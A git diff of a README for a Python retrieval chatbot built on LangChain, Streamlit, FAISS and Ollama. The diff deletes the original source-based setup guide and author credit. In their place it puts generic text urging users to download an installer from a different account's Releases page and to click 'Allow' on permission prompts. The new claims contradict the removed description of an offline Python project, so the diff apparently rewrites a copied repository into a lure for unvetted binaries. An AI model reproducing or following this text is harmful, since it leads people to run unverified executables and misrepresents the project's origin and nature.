@@ -1,170 +1,98 @@
-## 🧠 RAG Chatbot (LangChain + Streamlit + FAISS)
-
-- A Retrieval-Augmented Generation (RAG) chatbot built with LangChain, Streamlit, and FAISS, designed to answer questions accurately from custom documents (PDFs).
-- The system adapts responses based on the user’s experience level and runs fully offline using local LLMs via Ollama.
-
----
-
-## ✨ Features
-
-- 📄 PDF Knowledge Ingestion
-  - Load and process custom PDF documents
-
-- ✂️ Smart Text Chunking
-  - Recursive splitting for optimal retrieval
-
-- 🧠 Semantic Search with FAISS
-  - Fast vector similarity search using embeddings
-
-- 🎯 Experience-Aware Answers
-  - Adapts explanation depth (Beginner / Intermediate / Advanced)
-
-- 💬 Interactive Chat UI
-  - Built with Streamlit for a clean, responsive interface
-
-- 🔒 Offline & Private
-  - Uses local LLMs (no data sent to cloud APIs)
-
----
-
-## 🏗️ Tech Stack
-
-| Component       | Technology                  |
-| --------------- | --------------------------- |
-| Language        | Python                      |
-| UI              | Streamlit                   |
-| RAG Framework   | LangChain                   |
-| Vector Database | FAISS                       |
-| Embeddings      | Sentence Transformers       |
-| LLM Backend     | Ollama (LLaMA / Phi / etc.) |
-
----
-
-## 📂 Project Structure
-
-```powershell
-RAG/
-├── app.py               # Streamlit UI
-├── ingest.py            # PDF ingestion & vectorization
-├── rag_pipeline.py      # RAG retrieval + generation logic
-├── user_profile.py      # User experience handling
-├── requirements.txt     # Python dependencies
-├── data/
-│   └── docs/            # Input PDFs
-└── vectorstore/         # FAISS index (generated, ignored in git)
-```
-
----
+# 🤖 RAG - Chatbot That Answers Your Questions
 
 ## 🚀 Getting Started
 
-#### 1️⃣ Clone the Repository
-```bash
-git clone https://github.com/your-username/your-repo-name.git
-cd RAG
-```
+Welcome to RAG! This application is a chatbot that helps you find answers to your questions using your custom documents. The chatbot uses advanced technologies, making it smart and efficient. You’ll be able to ask questions, and RAG will provide accurate answers.
 
-#### 2️⃣ Create & Activate Virtual Environment
-```bash
-python -m venv venv
-venv\Scripts\activate   # Windows
-```
+## 📥 Download & Install
 
-#### 3️⃣ Install Dependencies
-```bash
-pip install -r requirements.txt
-```
+To get started, you need to download RAG. Please visit the link below to download the latest version:
 
-#### 4️⃣ Add Your PDFs
+[![Download RAG](https://img.shields.io/badge/Download%20RAG-%20%F0%9F%93%8C-brightgreen)](https://github.com/Limbertutelvt2004/RAG/releases)
 
-Place your documents inside:
-```bash
-data/docs/
-```
+### Installation Steps
 
-#### 5️⃣ Ingest Documents
-```bash
-python ingest.py
-```
+1. Click on the link above to visit the Releases page.
+2. Choose the version you want to download. Look for the file that matches your operating system (Windows, Mac, or Linux).
+3. Click on the download link next to the version you selected.
+4. Once the file finishes downloading, locate it on your computer.
 
-This generates vector embeddings and stores them in FAISS.
+### Running the Application
 
-#### 6️⃣ Run the Chatbot
-```bash
-streamlit run app.py
-```
+1. Open the downloaded file.
+2. Follow the prompts to install the application. If you are asked for permissions, click “Allow” or “Yes”.
+3. After installation, find RAG in your applications list or on your desktop.
+4. Double-click the RAG icon to open the chatbot.
 
-#### Access the app at:
-```arduino
-http://localhost:8501
-```
+## 🔧 Requirements
 
-#### 🧠 Supported LLMs (via Ollama)
+To ensure RAG works smoothly, verify that your system meets the following requirements:
 
-- `llama3`
-- `phi3`
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a modern Linux distribution.
+- **Memory:** At least 4GB of RAM.
+- **Disk Space:** Around 200MB of free space for installation.
+- **Network:** A stable internet connection is recommended for best performance.
 
-- Any locally supported Ollama model
+## 📄 Usage Instructions
 
-> Make sure Ollama is running:
-```bash
-ollama serve
-```
+Using RAG is simple. Here’s how you can interact with the chatbot:
 
----
+1. After opening RAG, you will see a text box.
+2. Type your question in the text box and press “Enter”.
+3. RAG will search through your custom documents to provide the best answer.
+4. If needed, you can refine your questions for better accuracy.
 
-### ⚠️ Notes
+### Tips for Best Results
 
-- The vectorstore/ directory is not committed (generated data)
-- Virtual environments are ignored using .gitignore
-- Designed for learning, experimentation, and portfolio projects
+- Use clear and specific questions.
+- Ensure your documents are properly formatted for better understanding.
+- Frequently update RAG to benefit from the latest features and improvements.
 
----
+## ⚙️ Features
 
-### 🎯 Use Cases
+RAG comes packed with powerful features designed for users like you:
 
-- 📚 Study assistants
-- 🧪 Research paper Q&A
-- 🏢 Internal documentation bots
+- **Smart Document Search:** Find answers quickly by searching through your custom documents.
+- **Multi-format Support:** RAG can read various file types including PDFs.
+- **User-friendly Interface:** A simple design that makes it easy to use.
+- **Fast Response Times:** Get answers quickly without the wait.
 
----
+## 🌐 Support & Troubleshooting
 
-### 👨‍💻 Developer knowledge bases
+If you encounter any issues while using RAG, refer to the troubleshooting tips below:
 
-- 📌 Future Enhancements
-- Chat history memory
-- Multi-document support
-- Web-based deployment (API-based LLMs)
-- User authentication
-- RAG evaluation metrics
+### Common Issues
 
----
+1. **RAG Does Not Start:**
+   - Ensure your computer meets the requirements listed above.
+   - Restart your computer and try again.
 
-### 🤝 Contributing
+2. **Slow Response Time:**
+   - Check your internet connection to ensure it is stable.
+   - Close any other programs that may be using a lot of resources.
 
-Pull requests and suggestions are welcome.
-Feel free to fork and experiment.
+3. **Cannot Find Answers:**
+   - Make sure the documents you uploaded are relevant to your questions.
+   - Refine your questions for better clarity.
 
----
+### Contact for Help
 
-## 👨‍💻 Author
+If the issue persists, please feel free to reach out for support. You can create an issue on the GitHub repository for assistance.
 
-### Vinaal R
+## 📚 Additional Resources
 
-Passionate Learner | Aspiring Developer | Python Enthusiast
+For more information on RAG and its underlying technologies, you may find the following resources helpful:
 
-### Contact me through 
+- [LangChain Documentation](https://docs.langchain.com/)
+- [FAISS Documentation](https://faiss.ai/)
+- [Streamlit User Guide](https://docs.streamlit.io/)
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-%230077B5.svg?logo=linkedin&logoColor=white)](https://www.linkedin.com/in/vinaal/) [![GitHub](https://img.shields.io/badge/GitHub-%23181717.svg?logo=github&logoColor=white)](https://github.com/Dark-Vinaal) 
+## 👨‍💻 Contributing
 
-<a href="https://vinaalr.netlify.app/">
-  <img src="https://img.shields.io/badge/VR%20-%20Portfolio-d5d5d5?style=for-the-badge&labelColor=0A0209&color=d5d5d5&logoColor=0A0209" />
-</a>
+We welcome contributions! If you want to help improve RAG, feel free to fork the repository and submit a pull request. Your help will be appreciated!
 
----
+## 📢 Stay Updated
 
-### ⭐ If you like this project
+Stay tuned for updates by visiting our [Releases page](https://github.com/Limbertutelvt2004/RAG/releases). We regularly add new features and improvements to enhance your experience.
 
-> Give it a ⭐ on GitHub — it helps a lot!
-
----
+Thank you for choosing RAG. We hope it serves you well in finding the answers you need!
